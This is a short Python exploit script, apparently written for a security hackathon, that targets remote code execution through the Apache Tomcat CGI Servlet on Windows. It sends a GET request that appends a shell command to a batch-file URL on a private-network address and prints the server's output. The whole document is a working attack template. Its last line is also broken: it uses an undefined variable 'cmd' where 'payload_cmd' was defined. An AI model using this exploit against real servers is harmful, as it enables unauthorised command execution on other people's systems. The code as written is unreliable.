'''
Title: Exploit for Remote Code Execution (RCE) in Apache Tomcat for CGI Servlet
Author: Yash Bansod <yashbansod33@gmail.com>
Team: IIT Mandi
Intended for: SAPTANG LAB'S NETWORK SECURITY HACKATHON
Description: Apache Tomcat has a vulnerability in the CGI Servlet which can be exploited to achieve remote code execution (RCE). This is only exploitable when running on Windows in a non-default configuration in conjunction with batch files.
Pre-requisites: enableCmdLineArguments to be true in web.xml
Tested on: Apache Tomcat v7.0.69
'''
import requests
def rce(url): #applies get request for the crafter url
    r = requests.get(url)
    print(r.content)

url = 'http://192.168.43.139:8080/cgi-bin/auxilary.bat?&'
payload_cmd = 'dir'
rce(url+cmd)
